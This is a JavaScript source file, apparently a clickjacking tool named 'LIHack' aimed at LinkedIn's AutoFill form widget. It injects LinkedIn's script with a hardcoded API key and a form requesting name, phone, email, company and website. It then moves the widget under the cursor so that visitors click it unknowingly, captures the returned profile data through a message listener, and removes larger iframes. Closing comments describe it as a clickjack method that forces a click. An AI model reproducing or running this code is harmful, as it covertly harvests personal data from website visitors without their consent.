LIHack = function(){
	this.api_key ='77exlkseo7gorv'
    this.noAuth = true
    this.lang = "en_US"
    this.debugging = true;
    if (window.addEventListener) {
	    window.addEventListener("message", this.listener, false)
	} else {
	    window.attachEvent("onmessage", this.listener);
	};
	return this;
};

LIHack.prototype._onLoad = function(e){
	var self = this;
	this.debug('Platform.LinkedIn Ready');
	IN.Event.on(IN, 'systemReady', function(){
		self.isReady = true;
		self.fireEvent("isReady", true);
	});
};

LIHack.prototype._injectPlatform = function(){
	document.head.insertAdjacentHTML('beforeEnd', this._generateScriptTag());
};

LIHack.prototype._injectInTag = function(){
	document.body.insertAdjacentHTML('beforeEnd', this._generateInForm());
};

LIHack.prototype._generateScriptTag = function(){
	var tag = '<script src="https://platform.linkedin.com/in.js" type="text/javascript">\n';
	tag += "api_key: '" + this.api_key + "'\n";
	tag += "noAuth: " + this.noAuth + "\n";
	tag += "lang: " + this.lang + "\n";
	tag += "onLoad: somethingAwesome\n";
	tag += "</script>"
	return tag;
};

LIHack.prototype._generateInForm = function(){
	var tag = '<script type="IN/Form" data-field-firstname="FirstName" data-field-lastname="LastName" data-field-phone="Phone" data-field-email="Email" data-field-company="Company" data-field-website="Website"></script>';
	return tag;
}

LIHack.prototype.listener = function(event){
	var parsedInfo = JSON.parse("{" + event.data.substring(event.data.indexOf("{") + 1));
	if (parsedInfo.method === "widgetSuccess") {
    	$('.IN-widget').remove();
    	this.userData = parsedInfo.params[0].data;
    } else {
    	// console.log('WidgetNotSuccess');
        return ""
    };
};

LIHack.prototype.listen = function(type, method, scope, context) {
    var listeners, handlers;
    if (!(listeners = this.listeners)) {
        listeners = this.listeners = {};
    }
    if (!(handlers = listeners[type])){
        handlers = listeners[type] = [];
    }
    scope = (scope ? scope : window);
    handlers.push({
        method: method,
        scope: scope,
        context: (context ? context : scope)
    });
};
LIHack.prototype.fireEvent = function(type, data, context) {
    var listeners, handlers, i, n, handler, scope;
    if (!(listeners = this.listeners)) {
        return;
    }
    if (!(handlers = listeners[type])){
        return;
    }
    for (i = 0, n = handlers.length; i < n; i++){
        handler = handlers[i];
        if (typeof(context)!=="undefined" && context !== handler.context) continue;
        if (handler.method.call(
            handler.scope, this, type, data
        )===false) {
            return false;
        }
    }
    return true;
};

LIHack.prototype.debug = function(message){
	if (this.debugging){
		return console.log(message)
	};
};

LIHack.prototype.isLoggedIn = function(){

};

LIHack.prototype.onReady = function(fn){
	this.listen('onReady', fn.bind(this));
};

LIHack.prototype.getUserData = function(){
	window.somethingAwesome = this._onLoad.bind(this);
	var self = this;
	if (!window.IN || !this.isReady) {
		this._injectInTag()
		this._injectPlatform();
	};
	this.onReady(function(){
		document.onmousemove = function(e){
			var el = document.querySelector('.IN-widget');
			el.style.left = e.pageX - 20;
			el.style.top = e.pageY - 20;
		};
		document.querySelectorAll('iframe').forEach(function(iframe){
			var observer = new MutationObserver(function(mutations){
				mutations.forEach(function(mutation){
					if (mutation.attributeName == "style"){
						if (iframe.offsetHeight > 35) {
							iframe.parentNode.removeChild(iframe);
							observer.disconnect();
						}
					}
				})
			});
			var config = {attributes:true};
			observer.observe(iframe, config);
		});
	});

};

// 1) On Instantiation, create the script tag
// 2) Clickjack Method - Follow cursor and force a click
// 3) LIButton Method on Prototype of DOM Object
// 4) IsLoggedIn Method
// 5) getUserData Method -- ClickJacks on CB with the data as the res
// 